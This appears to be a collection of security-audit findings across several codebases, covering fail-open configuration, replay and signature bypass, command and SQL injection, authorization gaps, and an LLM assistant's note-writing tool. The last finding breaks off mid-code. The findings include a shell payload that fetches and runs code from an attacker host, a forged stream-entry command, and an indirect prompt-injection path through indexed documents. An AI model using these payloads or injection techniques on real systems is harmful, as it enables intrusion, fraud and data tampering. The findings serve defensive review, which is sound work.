findings.title: ADMIN_SUBJECTS defaults to the wildcard `*` on every host where `stanchion_admins` is undefined — the whole production appserver tier
findings.evidence:
The admin allow-list is rendered with a fail-open Jinja default:

  roles/app/templates/app.env.j2:16-17
    # Comma separated list of subjects allowed on /admin.
    ADMIN_SUBJECTS={{ stanchion_admins | default(['*']) | join(',') }}

`stanchion_admins` is defined in exactly one place in the tree — group_vars/edge.yml:6-8 (svc-release@stanchion.net, ops-oncall@stanchion.net). It is not defined in group_vars/all.yml, there is no group_vars/appservers.yml, and inventory/production.yml sets only `stanchion_env` and `stanchion_region` at the `all` level. Therefore, for the three hosts of group `appservers` (inventory/production.yml:16, :18, :20) the variable is undefined and the filter substitutes `['*']`, rendering `ADMIN_SUBJECTS=*` into /opt/stanchion/app.env.

The undefined case is precisely the case where the operator has not decided who may administer the box, and the template resolves that uncertainty by granting everyone. A missing or renamed variable (a typo in a future group_vars file, a group_vars file that fails to load) has the same effect, silently, with no task failing.

The deploy play that renders this file targets `hosts: appservers:edge` (playbooks/site.yml:9) against inventory/production.yml (ansible.cfg:2), and playbooks/rotate-secrets.yml:10-15 re-renders the same template over the same host set, so the wildcard is refreshed on each rotation as well.
findings.impact: Every caller reaching the /admin surface of the three production application servers passes the subject allow-list. Chained with AUTH_MODE=trusted-header on the same hosts (rendered two lines above, same file), an unauthenticated request on the internal network can assert any subject via X-Stanchion-Subject and then be admitted to the administrative surface — no credential, no token, no membership in the operator list.
findings.recommendation: Remove the default so an unset variable fails the run: `ADMIN_SUBJECTS={{ stanchion_admins | mandatory | join(',') }}`, and define `stanchion_admins` in group_vars/all.yml with the operator list (overriding per group where needed). If a closed default is wanted instead, use `default([])` — an empty allow-list denies everyone — never `['*']`.

triage.reason: Reported under FP-08 as an intrinsic fail-open default; the rendered artifact is produced by this repository regardless of whether the consumer is in scope.
Not a missing-hardening nitpick: the repository ships an explicit wildcard grant, which is an affirmative authorization decision, not an absent one.
There is no working mitigation being second-guessed; the allow-list mechanism itself is what resolves to '*'.

scope.established_by: The `| default(['*'])` filter at roles/app/templates/app.env.j2:17 combined with `stanchion_admins` being defined only for the edge group (group_vars/edge.yml:6-8); the template is rendered for appservers:edge by playbooks/site.yml:9 and again by playbooks/rotate-secrets.yml:10-15.
scope.narrowed_by: edge-01/edge-02 render the real two-entry operator list because group_vars/edge.yml defines the variable for that group.

findings.title: AUTH_MODE falls back to `trusted-header` for every production host outside the `edge` group, turning caller identity into an attacker-supplied HTTP header
findings.evidence:
The environment template picks the authentication mode from the deployment profile with an else-branch, not an allow-list:

  roles/app/templates/app.env.j2:11-14
    # `jwt` verifies the OIDC access token on every request. `trusted-header` takes
    # the caller identity from X-Stanchion-Subject, which is what the pre-production
    # fleet uses so the smoke tests can impersonate any tenant.
    AUTH_MODE={{ 'jwt' if app_profile == 'hardened' else 'trusted-header' }}

`app_profile` defaults to `standard` for every host (group_vars/all.yml:17) and is raised to `hardened` only in group_vars/edge.yml:3, whose comment states the reason: "The edge tier is internet facing, so it runs the full profile." There is no group_vars/appservers.yml — the only group_vars files in the tree are all.yml and edge.yml. The inventory being used is production (ansible.cfg:2 `inventory = inventory/production.yml`, and inventory/production.yml:3 sets `stanchion_env: production`), and it defines three appservers — app-01/02/03.stanchion.net (inventory/production.yml:14-21) — all of which are targeted by the deploy play `hosts: appservers:edge` (playbooks/site.yml:9).

So on all three production application servers the rendered file contains `AUTH_MODE=trusted-header`, which by the template's own documentation means the service derives the caller identity from the `X-Stanchion-Subject` request header. Anything that can reach the service — the sibling edge tier, the rollup job, any host or workload on 10.42.0.0/16, or any request that survives a proxy that does not strip the header — asserts whatever subject it likes. The mode exists for the pre-production fleet ('so the smoke tests can impersonate any tenant') but the default makes it the production behaviour for every non-edge host.

The fail-open direction is the root cause: an unknown or misspelled profile value ('Hardened', 'strict', a typo) also lands in the else-branch and disables token verification, rather than failing the run.
findings.impact: Complete authentication bypass and cross-tenant impersonation on the production application tier: an attacker who can send an HTTP request to app-01/02/03 sets `X-Stanchion-Subject` to any tenant or operator identity and is treated as that principal, with no OIDC token required. Compounded by the wildcard ADMIN_SUBJECTS rendered on the same hosts, the spoofed subject also passes the /admin allow-list.
findings.recommendation: Make the insecure mode opt-in and explicit, never a fallback: render `AUTH_MODE={{ app_profile_auth_mode }}` from a per-group variable that has no default, and add an `assert` in roles/app that fails the play when `app_profile not in ['hardened']` for any host whose `stanchion_env == 'production'`. Set `app_profile: hardened` as the value in group_vars/all.yml and downgrade it only in a pre-production inventory.

triage.reason: Reported deliberately under FP-08: the flawed configuration is intrinsic and rendered on production hosts even though the consuming service source is not part of this corpus; the template documents the semantics.
Deterministic and reproducible: `ansible-playbook playbooks/site.yml --limit appservers --check --diff` renders AUTH_MODE=trusted-header every time with the committed inventory and group_vars.
No unusual invocation is needed; the committed default plus the committed production inventory produce the weak value.

scope.established_by: The else-branch of the Jinja conditional at roles/app/templates/app.env.j2:14 combined with the fleet-wide default `app_profile: standard` at group_vars/all.yml:17; it takes effect on every host of group `appservers` in inventory/production.yml, which the deploy play targets at playbooks/site.yml:9 and the rotation playbook re-renders at playbooks/rotate-secrets.yml:10-15.
scope.narrowed_by: Hosts in the `edge` group are unaffected: group_vars/edge.yml:3 overrides app_profile to `hardened`, so edge-01/02 render AUTH_MODE=jwt.

findings.title: ledger.post.v1 has no replay protection: the posting handler is the only one wired without idempotency, so the same message credits the account again on every redelivery
findings.evidence:
The dispatch table itself shows the asymmetry - the payout handlers get the idempotency store, the posting handler does not:

```js
const HANDLERS = {
  'ledger.post.v1': makeLedgerPostingHandler({ ledger, pool, log }),
  'payout.release.v1': makePayoutReleaseHandler({ ledger, pool, idempotency, log }),
  'payout.release.v2': makePayoutReleaseHandler({ ledger, pool, idempotency, log }),
}
```
(src/consumer.js:27-31)

`makeLedgerPostingHandler` (src/handlers/ledgerPosting.js:18-50) never consults a dedupe store, and `applyPosting` writes an unconditional row and an unconditional balance update:

```js
        `insert into postings (account_id, amount_cents, currency, memo, reference)
         values ($1, $2, $3, $4, $5)`
```
(src/ledger.js:31-32) and `balance_cents = excluded.balance_cents` with `next = current + amountCents` (src/ledger.js:23-24, :36-38). There is no `on conflict` and no uniqueness on `envelope.id` or `reference` in this insert - the only `on conflict do nothing` in the handler is on `posting_tags` (src/handlers/ledgerPosting.js:36), a denormalised tag table that does not gate the balance.

Nothing upstream deduplicates either. `verifySignature` (src/signing.js:33-46) checks a timestamp skew against `maxSkewSeconds: 300` (config/default.json:19) but keeps no nonce or seen-id set, and `envelope.id` is never recorded anywhere. So a byte-for-byte identical message - including a correctly signed one captured off the wire - re-published inside the 300-second window is accepted and applied again, and again. Untrusted bytes enter at src/consumer.js:49.

The posting handler also overwrites `${SPOOL_DIR}/${accountId}.json` on every application (src/handlers/ledgerPosting.js:41-46), so the spool leaves no trace of the duplicates either.

This is a replay flaw independent of the signature mode: it is what remains once `signature.mode` is flipped to `enforce`.
findings.impact: Unlimited replay of any observed or forged posting event. Each redelivery adds `amountCents` to the balance again - the credit path (`minimum: 1` at schema.js:34) means replay is pure inflation of an account balance, up to 500,000.00 per replay, with a matching duplicate row in `postings`. An attacker who captures one legitimate signed posting event can re-publish it repeatedly within the skew window even after signature enforcement is turned on.

Independently, record consumed `envelope.id`s for the length of the skew window in `verifySignature` so a replayed message is rejected before dispatch.

triage.reason: This is not an adjacent flaw layered on a working mitigation - no replay mitigation exists on this path at all; the idempotency store the codebase already owns is simply not wired to it.
Fully reproducible and attacker-driven: re-publishing the identical body is a deterministic action, not a timing race.
Replay protection on a credit-posting pipeline is the control, not a hardening nicety - and the same codebase treats it as required for the sibling handler.

findings.title: Signature check is skipped for any stream entry carrying a self-asserted verified=1 field, and DLQ replay stamps bad-signature messages with exactly that field
findings.evidence:
The consumer treats a plain stream field as proof that the message was already authenticated:

```js
  // Entries the DLQ tool put back on the stream were already checked when they
  // first arrived, so they carry the verdict with them.
  if (entry.verified !== '1' && !verifySignature(envelope, entry.signature, log)) {
```
(src/consumer.js:58-60)

`entry` is built from the raw Redis stream fields at src/consumer.js:48 via `fieldsToObject(fields)` (src/consumer.js:41-45), where the untrusted message enters the process. `verified` is not part of the signed canonical string - `canonical()` covers only `id`, `type`, `ts` and `JSON.stringify(payload)` (src/signing.js:6-8), so it is outside the integrity envelope by construction. Any producer that can `XADD ledger.events * body '<json>' verified 1` short-circuits the whole `verifySignature` call.

The premise stated in the comment is also false for the DLQ path. `replay()` re-admits everything parked, unconditionally stamped as verified:

```js
    await redis.xadd(config.redis.stream, '*', 'body', entry.body, 'verified', '1')
    await redis.xdel(config.dlq.stream, id)
```
(src/dlq.js:37-38)

But the DLQ is exactly where messages that FAILED the signature check are parked: `await redis.xadd(config.dlq.stream, '*', 'body', entry.body, 'reason', 'bad-signature')` (src/consumer.js:62). So a message rejected for a forged signature is written to the DLQ and, on the next `node src/dlq.js replay`, is put back on the live stream with the verification permanently skipped. `replay()` reads no `reason`, applies no filter, and moves up to `maxReplayBatch: 500` entries (config/default.json:29) in one call. The re-admitted body then flows straight to a handler at src/consumer.js:73-79.

A second admission channel exists: the DLQ stream is on the same unauthenticated Redis instance, so an attacker can `XADD ledger.events.dlq` directly and wait for an operator to run `replay`.
findings.impact: Two independent ways to bypass producer authentication that survive turning `signature.mode` on to `enforce`. (1) Direct: any writer to the stream sets `verified 1` on its own forged entry and the HMAC is never computed. (2) Laundering: a forged message is parked with reason `bad-signature`, and the next operator DLQ replay re-admits it as trusted, executing ledger postings and payout releases from an unsigned message.
findings.recommendation: Delete the `entry.verified !== '1'` short-circuit and verify every entry read off the stream, replays included. If a replay must avoid recomputing the HMAC, carry the original signature field through `replay()` (`'signature', entry.signature`) and re-verify, and refuse to replay entries whose parked `reason` is `bad-signature` at all. Never let a message assert its own verification verdict in a field that is outside `canonical()`.

triage.reason: No caller misuse is required: replay() is the documented operator tool (package.json:9 exposes it as `npm run dlq`) and it always stamps verified=1.

This is not an adjacent flaw invented on top of a working mitigation - the bypass is a distinct construct (a trusted message-supplied field) that persists even after the fail-open mode of signing.js is fixed.
Trust boundary cited: untrusted stream fields enter at src/consumer.js:48 via fieldsToObject, and the body at src/consumer.js:49.

scope.established_by: consumer.js:60 makes the unsigned, message-supplied `verified` field a bypass of verifySignature; dlq.js:37 sets that same field on every replayed entry, including the ones consumer.js:62 parked for a bad signature.
scope.narrowed_by: The laundering variant needs an operator to run `node src/dlq.js replay`; the direct variant needs only stream write access and no operator action.

searched.found: nothing - replay() reads only entry.body and never inspects entry.reason or entry.signature

findings.title: OS command injection in the DLQ notifier: attacker-controlled memo is interpolated into a shell string passed to child_process.exec
findings.evidence:
`notifyOldest()` builds a shell command by string interpolation and runs it through `exec`, which spawns `/bin/sh -c`:

```js
  const entry = fieldsToObject(oldest[1])
  const envelope = JSON.parse(entry.body)
  const memo = envelope.payload?.memo ?? envelope.type

  const { stdout } = await execAsync(
    `${config.dlq.notifyCommand} --channel ops --reason "${entry.reason}" --memo "${memo}"`,
  )
```
(src/dlq.js:54-60, with `const execAsync = promisify(exec)` at src/dlq.js:7 and the `node:child_process` import at src/dlq.js:1)

`memo` comes straight out of the parked message body, which is attacker-supplied JSON: the untrusted bytes enter the DLQ tool at src/dlq.js:55 (`JSON.parse(entry.body)`) and originally entered the system at src/consumer.js:49. The body is parked verbatim - `redis.xadd(config.dlq.stream, '*', 'body', entry.body, ...)` at src/consumer.js:54 and src/consumer.js:69 stores the raw string, not a sanitised copy.

Crucially the HTML escaping applied on the success path does not apply here. `escapeHtml` (src/handlers/ledgerPosting.js:9-16) runs only inside the posting handler, after validation, on the way to the database; the DLQ holds the pre-escape original. And even if it had run, it neutralises `<>&"'` - not `$(...)`, backticks, or `;` - which are the metacharacters that matter inside a double-quoted shell word.

Getting a chosen memo into the DLQ is trivial and needs no signature: publish an envelope of type `ledger.post.v1` whose payload carries the payload `memo` plus any field that fails the schema (e.g. `reference` longer than 64 chars, or `amountCents: 0`). Validation fails at src/consumer.js:66 and the whole body is parked at src/consumer.js:69. A body that fails the envelope schema instead is parked at src/consumer.js:54, with `envelope.payload?.memo` still readable by the DLQ tool. `notifyOldest` reads the OLDEST entry (`xrange(..., '-', '+', 'COUNT', 1)`, src/dlq.js:51), so an attacker whose entry is first in an empty or freshly purged DLQ is the one that gets executed - and `purgeStream` / normal replay drain the queue regularly.

A memo of `x$(curl -s http://attacker/p|sh)` or `x";id;"` executes as the DLQ tool's user when an operator runs `node src/dlq.js notify` (wired at src/dlq.js:75 and exposed as `npm run dlq` in package.json:9).

`entry.reason` is interpolated on the same line and, on the malformed-envelope path, is `ajv.errorsText(...)` derived from the attacker's document (src/consumer.js:54).
findings.impact: Remote command execution on the host running the DLQ tooling - the operator box or job that pages on-call - triggered by a message an unauthenticated stream writer parked earlier. The attacker chooses the command; it runs with the privileges of the DLQ process, which also holds the Redis connection and (via the same repo config) the ledger database credentials in its environment.
findings.recommendation: Replace `exec` with `execFile` (or `spawn`) and pass the arguments as an array - `execFile(config.dlq.notifyCommand, ['--channel', 'ops', '--reason', String(entry.reason), '--memo', String(memo)])` - so no shell is involved. Additionally cap and whitelist the memo characters before it leaves the process.

triage.reason: FP-08 argues FOR reporting: this is a direct injection path (untrusted string into a shell) and it is additionally reachable through the documented `dlq.js notify` command.
The vulnerable interpolation is inside the shipped function, not something a caller has to misuse; the operator running `npm run dlq notify` is the intended use.
Reproducible: the attacker controls the memo bytes end to end and can park as many candidate entries as needed; only the timing of the operator's notify run varies.

scope.established_by: dlq.js:58-60 concatenates envelope.payload.memo (read at dlq.js:56 from the attacker-controlled parked body) and entry.reason into a single string handed to promisify(exec) (dlq.js:7), which runs it under /bin/sh -c.
scope.narrowed_by: Execution happens only when someone runs the `notify` subcommand (dlq.js:75), and only against the oldest parked entry (dlq.js:51).

searched.found: nothing - the values are interpolated raw inside double quotes, which still expand $() and backticks

searched.for: sanitisation of memo before it is parked, i.e. whether escapeHtml runs on the DLQ path
searched.found: escapeHtml exists but runs only in the posting handler after validation; consumer.js:54 and 69 park the raw `entry.body` string, so the DLQ holds the unescaped memo

findings.title: Payout release moves money through adjustBalance, which skips the solvency check and the per-entry ceiling that applyPosting enforces, and is not in the same transaction as the payout row
findings.evidence:
There are two ways to change a balance in this service and only one of them is guarded.

`applyPosting` locks the row, recomputes, and refuses to go negative:

```js
    if (!Number.isInteger(amountCents) || amountCents === 0) { throw ... }
    if (Math.abs(amountCents) > config.limits.maxPostingCents) { throw ... }
    ...
    'select balance_cents from balances where account_id = $1 for update'
    ...
      if (next < 0) {
        await client.query('rollback')
        throw new Error('posting would overdraw the account')
      }
```
(src/ledger.js:9-14, :19-22, :25-28)

`adjustBalance` does none of that - no integer check, no ceiling, no `for update`, no negativity check, no transaction:

```js
  /** Direct balance write used by the settlement reconciliation. */
  async function adjustBalance(accountId, deltaCents) {
    await pool.query(
      `insert into balances (account_id, balance_cents) values ($1, $2)
       on conflict (account_id) do update set balance_cents = balances.balance_cents + $2`,
      [accountId, deltaCents],
    )
  }
```
(src/ledger.js:58-65)

Despite the comment scoping it to reconciliation, the payout path is what calls it:

```js
    await ledger.adjustBalance(p.accountId, -Math.abs(p.amountCents))
```
(src/handlers/payoutRelease.js:28)

So a payout is released against an account-supplied amount with no check that the account holds the money. The handler never calls `ledger.readBalance` (src/ledger.js:50-56 - it is exported at src/ledger.js:67 and used nowhere in the partition), and the `payouts` row is written as `'released'` (src/handlers/payoutRelease.js:20-23) before the debit, on a separate `pool.query` with no surrounding `begin`/`commit`, so the two writes are not atomic and can be interleaved or half-applied.

The account id and the amount are message-supplied and reach here from src/consumer.js:49. For `payout.release.v1` the schema caps the amount at 50,000,000 cents per event, but nothing caps the number of events, so N releases of the maximum drive the balance arbitrarily negative. For `payout.release.v2` there is no schema at all (see the separate finding), so a single event does it.
findings.impact: Money is released that the account does not hold: the balance simply goes negative and the discrepancy is deferred to a next-morning reconciliation job. An attacker who can publish payout events - or a producer bug - drains the platform account, because the only server-side solvency control in the codebase (`next < 0` in applyPosting) is on a code path the payout handler does not use. The lack of a transaction around the payout row and the debit additionally allows a released payout with no corresponding balance movement.
findings.recommendation: Route the payout debit through a guarded path: open one transaction in the handler, `select ... for update` the balance, refuse the release when `balance_cents - amountCents < 0`, insert the `payouts` row and update the balance inside that same transaction, and commit once. Give `adjustBalance` the same integer/ceiling checks `applyPosting` has, or make it private to the reconciliation caller its comment claims.

triage.reason: A solvency check on a payout is the primary authorisation control for moving money, not a defence-in-depth extra; the codebase implements it for postings and omits it for payouts.
The unguarded API is invoked by the shipped handler in this partition (payoutRelease.js:28), not by a hypothetical caller.
Deterministic, not timing-dependent: a single release larger than the balance already succeeds.

scope.established_by: ledger.js:59-65 provides an unguarded direct balance write, and handlers/payoutRelease.js:28 uses it for the release, so the solvency check at ledger.js:25-28 and the ceiling at ledger.js:12-14 never run for a payout; both registered payout types (consumer.js:29-30) share this handler.
scope.narrowed_by: Per-event size is still capped at 50,000,000 cents for payout.release.v1 by the schema at schema.js:46; that cap does not exist for payout.release.v2 and does not limit the number of events.

searched.found: nothing - the handler goes claim -> insert payouts 'released' -> adjustBalance, with no balance query

findings.title: `write_note` is a model-driven file write scoped only to the tenant, so one user's assistant turn silently overwrites any other user's note in that tenant
findings.evidence:
`beaconindex/tools.py` exposes a filesystem write to the model:

    def write_note(principal: Principal, name: str, content: str) -> str:
        """Saves a short note into the caller's scratch directory."""
        directory = pathlib.Path(config()["tools"]["write_note"]["directory"]) / principal.tenant   # tools.py:32
        directory.mkdir(parents=True, exist_ok=True)
        path = directory / f"{name}.md"                                                             # tools.py:34
        path.write_text(content[:40_000], encoding="utf-8")                                          # tools.py:35
        return str(path)

The docstring says "the caller's scratch directory", but the path is derived from `principal.tenant` alone. `Principal` carries a `subject` (acl.py:20) and even provides a ready-made per-caller identifier - `def key(self) -> str: return f"{self.tenant}:{self.subject}"` (acl.py:24-25) - which is not used here or anywhere else on this path. Every user of a tenant therefore shares one flat namespace under `/var/lib/beacon/notes/<tenant>/` (config/beacon.yaml:52-53), and `write_text` truncates and replaces an existing file without any existence check, ownership check or `may_read`/`may_write` equivalent.

Both arguments are chosen by the model, not by the human: `answer()` dispatches whatever the model emitted - `_run_tool(principal, use["name"], use.get("input", {}))` (assistant.py:127) -> `handler(principal, **_validate_tool_input(spec, arguments))` (assistant.py:99). `_validate_tool_input` enforces only the declared schema (tools.py:66-73): `name` against `^[a-z0-9][a-z0-9-]{0,63}$` and `content` against `maxLength: 40000`. The content is otherwise entirely free-form. Because the model's context is the retrieved document text spliced into the system prompt (assistant.py:110), those arguments are attacker-influenceable by anyone who can get a chunk indexed into the victim's tenant - the trust boundary crossings being ingest.py:92 (authenticated upload) and ingest.py:123 (crawler queue).

A secondary defect in the same validator: `re.match(rules["pattern"], value)` (assistant.py:66) relies on `$`, which in Python also matches immediately before a trailing newline, so `name = "notes\n"` passes the pattern and produces the filename `"notes\n.md"`. That does not escape the directory - no `..` or `/` can pass the character class - but it means the declared pattern is not the pattern actually enforced.
findings.impact: Within a tenant there is no isolation between users' notes: user A's assistant turn (or a document-borne instruction executing during user B's turn) can overwrite the note named `meeting-notes` belonging to any colleague, destroying its contents and replacing them with up to 40,000 characters of attacker-chosen text. Combined with the indirect prompt injection into the system prompt this becomes a persistence primitive - the injected text is written to disk under the victim's tenant, outliving the conversation, and is presented to the victim as a note his own assistant saved for him.
findings.recommendation: Scope the directory to the individual caller, not the tenant: use `pathlib.Path(base) / principal.tenant / principal.subject` (or the existing `principal.key()` from acl.py:24-25, sanitised) so notes cannot collide across users. Refuse to clobber an existing file unless the caller explicitly asked to replace it (open with `x` mode, or version the filename), resolve the final path and assert it stays under the per-caller directory before writing, and anchor the schema pattern with `\A...\Z` instead of `^...$` in `_validate_tool_input` (assistant.py:66). Treat a write as an action requiring confirmed human intent rather than one the model may take on its own from document-derived context.

triage.reason: The only caller, `_run_tool` (assistant.py:99), invokes the tool exactly as designed and passes the correct principal; the missing per-subject scoping is inside `write_note` itself.

This is not defence-in-depth advice: the docstring states the write is scoped to 'the caller', and the code scopes it to the tenant, so users who should be isolated from each other are not. That is a concrete authorisation gap, not extra hardening.

`pathlib` is used correctly; the finding is about the identity component missing from the path and the unconditional clobber, not about the library. The `^...$` vs `\A...\Z` point is reported explicitly as not producing traversal.
The impact is cross-user integrity and injected-content persistence, not disk exhaustion.

Trust boundaries cited: model-produced arguments enter at assistant.py:127 (`use.get('input', {})`), and the document text that steers the model enters at ingest.py:92 / ingest.py:123 and reaches the system prompt at assistant.py:110.

scope.established_by: The destination directory at tools.py:32 is keyed on `principal.tenant` only, and tools.py:35 writes unconditionally with `write_text`, while the tool is exposed to the model through TOOL_SPECS (tools.py:62-73) / TOOL_REGISTRY (tools.py:90) and dispatched from the loop at assistant.py:127.
scope.narrowed_by: The `name` schema pattern (tools.py:69, enforced at assistant.py:66) confines the basename to lowercase alphanumerics and hyphens, so no path traversal is possible; the extension is fixed to `.md` and content is truncated to 40,000 characters. The blast radius is therefore one tenant's note directory, not the filesystem.

searched.found: nothing - only `principal.tenant` is in the path and `write_text` replaces any existing file

searched.for: an existing per-caller identifier that the write path could have used, to confirm the tenant-only scoping is a defect rather than the only option available
searched.found: `Principal.subject` and `Principal.key()` returning `f"{self.tenant}:{self.subject}"` - present and unused on this path

searched.found: only JSON-schema type/length/pattern checks; any tool present in TOOL_REGISTRY is invoked directly with the principal

searched.found: a single flat `directory: /var/lib/beacon/notes`

findings.title: Service tokens are signed with a hardcoded fallback key when SERVICE_TOKEN_KEY is unset
findings.evidence:
The token minted for machine-to-machine clients is signed with a literal key baked into the source when the environment variable is missing:

    const key = new TextEncoder().encode(process.env.SERVICE_TOKEN_KEY ?? 'local-development-key')   // src/auth.ts:99
    return new SignJWT({ act: client.account, roles: client.roles })                                 // src/auth.ts:100
      .setProtectedHeader({ alg: 'HS256' })
      .setIssuer(ISSUER)
      .setAudience('pulsegate-api')
      .setSubject(`svc:${grant.client_id}`)
      .setExpirationTime('1h')
      .sign(key)

The claims this key authenticates are privileged: `act: 'acct_platform'` with `roles: ['service','billing-writer']` for the billing-sync client (src/auth.ts:72-76). HS256 is symmetric, so possession of the key is possession of the signing authority - anyone with the source (or anyone who guesses a stock development default) can mint a token asserting any account and any role set, including 'ops-admin'.

The defect is specifically the fail-open default. The function immediately above it does the opposite for the client secret and refuses to issue anything when the environment is unconfigured: `if (!client || client.secret.length === 0) return null` (src/auth.ts:96). The signing key gets no such treatment: an environment that forgets SERVICE_TOKEN_KEY does not fail, it silently downgrades to a publicly known secret, and nothing in the process logs or startup path surfaces the downgrade.

Honest scope: this API's own bearer path verifies against a remote JWKS (`jwtVerify(..., JWKS, ...)`, src/auth.ts:34, with JWKS built at src/auth.ts:6), which resolves asymmetric keys only, so a token minted here would not be accepted by actorFromBearer. The exposure therefore lands on whatever consumes the tokens this endpoint hands out over /oauth/token (src/index.ts:27-35) - and that consumer, wherever it lives, validates with the same shared secret.
findings.impact: In any deployment where SERVICE_TOKEN_KEY is not set, every service token is signed with a secret published in the repository. An attacker who has seen the source can forge tokens bearing arbitrary `act` (account) and `roles` claims with a one-hour lifetime, impersonating the platform billing-writer service to any component that trusts these tokens - without ever knowing a client secret.
findings.recommendation: Remove the fallback and fail closed at startup: read SERVICE_TOKEN_KEY once at module load and throw if it is absent or shorter than 32 bytes, mirroring the `client.secret.length === 0` guard already applied to client secrets. Better, drop the shared symmetric secret entirely and sign service tokens with the same asymmetric key the JWKS publishes, so mint and verify use one key material and a leaked signing key cannot be a copy-pasted literal.

triage.reason: FP-08 is the rule that keeps this finding: a hardcoded static secret is an intrinsic flaw and is reportable even where the current in-repo call graph does not exercise it.
Not missing hygiene: the literal is the actual signing authority for privileged service claims, not an absent hardening layer.

Exploitation requires SERVICE_TOKEN_KEY to be unset in the target environment, which I cannot observe from the repository; severity is set to MEDIUM to reflect that conditionality rather than assumed worst case.

scope.established_by: the `?? 'local-development-key'` default on the HS256 signing key in mintServiceToken (src/auth.ts:99), reachable from the unauthenticated POST /oauth/token handler at src/index.ts:27
scope.narrowed_by: Only takes effect when SERVICE_TOKEN_KEY is unset in the environment, and a caller must still present a valid client secret to obtain a minted token; tokens signed this way are not accepted by this API's own bearer verification, which uses a remote JWKS.

findings.title: Entitlement cache key omits the caller's roles, so a non-operator inherits the operator feature set cached by an ops-admin in the same account
findings.impact: The per-role filter on the entitlements endpoint is not enforced for cached reads: a non-operator member of an account that contains an operator is served the operator feature set, and clients that gate UI or client-side capability on `features.includes('admin-api')` will unlock the operator surface for a user who does not hold the role. It also discloses to any member whether their account is provisioned with the admin API / has an operator, and the inverse poisoning intermittently strips a real operator of the feature.
findings.recommendation: Cache only the account-derived part (plan, seats, apiCallsPerDay, the unfiltered feature list) and apply the role filter after the cache read, outside the memoised closure. If the filtered result must be cached, put the identity dimension in the key (e.g. `ent:v3:${accountId}:${sortedRoles.join('+')}` or a hash of it) so two callers with different roles cannot collide.

triage.reason: Deterministic once an operator populates the entry; reproducible by calling the endpoint as the operator and then as a plain member within the 300s TTL. Not a fragile-environment artifact.
Not a resource-exhaustion issue; the defect is key confusion producing a wrong authorization-relevant answer.
Attacker-controlled data enters at src/auth.ts:52 -> actor.roles/actor.accountId, consumed at src/entitlements.ts:41 (key) and :46 (filter).

scope.established_by: entitlementKey (src/cache.ts:23-25) keying solely on accountId while the memoised loader at src/entitlements.ts:45-47 varies its output by actor.roles
scope.narrowed_by: Only the 'admin-api' feature varies by role today, the entry lives at most 300s, and the confusion is limited to actors sharing one accountId - a member of another tenant cannot read it.

searched.for: any per-caller dimension mixed into the key or a vary-style check before returning a hit
searched.found: nothing - the hit is JSON.parsed and returned unconditionally

searched.for: the role filter being applied outside the cached() closure, which would make the shared key harmless
searched.found: the filter is inside the loader, so its result is what gets stored

searched.for: an invalidation triggered by a role/identity change that would keep the entry aligned with the caller
searched.found: invalidation happens only on member insert/patch and plan change, never per-actor

searched.for: server-side authorization that reads Entitlements.features, which would turn this into a direct authz bypass
searched.found: nothing - the ops gate uses hasRole(actor,'ops-admin') directly, so the impact is the entitlements response itself and whatever the client does with it

findings.title: The bundled pgbouncer is published on 0.0.0.0:6432 while the app itself is bound to loopback, and no host firewall is applied outside the bastion
findings.evidence:
The container task publishes two ports with deliberately different bind addresses:

  roles/app/tasks/main.yml:57-61
    published_ports:
      - "127.0.0.1:{{ app_listen_port }}:8080"
      # The rollup job and the read-replica tooling connect straight to the
      # bundled pgbouncer instead of going through the app.
      - "0.0.0.0:6432:6432"

The first entry shows the intended posture — the API is reachable only through loopback (a local reverse proxy). The second entry publishes the database connection pooler on every interface of the host, including 10.42.2.21/22/23 (appservers) and 10.42.1.11/12 (edge) per inventory/production.yml:9-21, for the benefit of two out-of-band consumers that are not named as source addresses anywhere in the tree.

Nothing in this repository confines that port:

- The only firewall configuration is in roles/bastion/tasks/main.yml:7-32, and the task named 'Default deny inbound on every host in the fleet' (line 7) is misleading: playbooks/site.yml:2-6 applies the `bastion` role to `hosts: bastion`, which inventory/production.yml:23-27 resolves to the single host jump-01.stanchion.net. The appservers and edge hosts never get ufw installed or enabled, so the default-deny and the 203.0.113.0/24 source restriction (roles/bastion/tasks/main.yml:31) do not cover them.
- Even if ufw were applied there, docker's published-port DNAT rules are evaluated before the filter INPUT chain ufw manages, so a 0.0.0.0 publish would remain reachable.

The result is a Postgres-protocol endpoint listening on all interfaces of five production hosts with no network-level restriction expressed in the infrastructure code.
findings.impact: Any workload with a route to 10.42.1.0/24 or 10.42.2.0/24 — a compromised container elsewhere in the fleet, a neighbouring service, an attacker who lands anywhere in the VPC — can open Postgres-protocol sessions against the pooler on all five hosts: credential brute force at minimum, and full database access with the `stanchion_app` password (which the same role exposes locally via the world-readable app.env, see the chmod finding). The pooler also multiplies the attack surface of db-01.stanchion.net, which the inventory otherwise reaches only from the app tier.
findings.recommendation: Bind the pooler to the interface its two consumers actually use instead of every interface — `"10.42.2.21:6432:6432"` per host via a variable, or keep it on 127.0.0.1 and reach it over an SSH/WireGuard tunnel from the rollup job. If it must be network-reachable, add explicit DOCKER-USER rules (or security-group equivalents) allowing only the rollup and read-replica source addresses, and apply the firewall tasks of roles/bastion to the whole fleet as the task name already claims.

triage.reason: This is an affirmative exposure decision written in the code (0.0.0.0 chosen where the adjacent line chose 127.0.0.1), not a missing extra layer.
The impact claimed is unauthorized reachability of a database path, not resource exhaustion.
No caller misuse is involved; the bind address is fixed in the role and applies to all five production hosts as written.

scope.established_by: The `0.0.0.0:6432:6432` published port at roles/app/tasks/main.yml:61, applied by the app role to every host of appservers:edge (playbooks/site.yml:9); no compensating firewall exists for those groups because roles/bastion is applied only to hosts:bastion (playbooks/site.yml:3).
scope.narrowed_by: The exposure is limited to whatever can route to 10.42.1.0/24 and 10.42.2.0/24; the API port on the same hosts is correctly restricted to 127.0.0.1.

searched.for: a ufw/iptables/DOCKER-USER task in the app role that would restrict 6432 to the rollup and read-replica hosts
searched.found: nothing — the role's only network-related tasks are the sysctl block at lines 66-75 (which is itself gated by a condition that never matches)

searched.for: the bastion role (which carries the default-deny ufw policy) being applied to appservers or edge as well
searched.found: `hosts: bastion` with `roles: [bastion]` only; the second play for appservers:edge has no firewall role

searched.for: a variable restricting pgbouncer's bind address or an allow-list of source ranges for 6432
searched.found: bastion_allowed_ports (22, 2222) which is consumed only by the bastion role, and the postgres connection vars; nothing referencing 6432

findings.title: SQL injection sink in the posting handler: message-supplied currency is string-interpolated into the posting_tags INSERT while every other column is parameterised
findings.evidence:
The posting handler builds one query with a mix of bind parameters and raw interpolation:

```js
    await pool.query(
      `insert into posting_tags (account_id, reference, currency, posted_at)
       values ($1, $2, '${p.currency}', now())
       on conflict do nothing`,
      [p.accountId, p.reference ?? null],
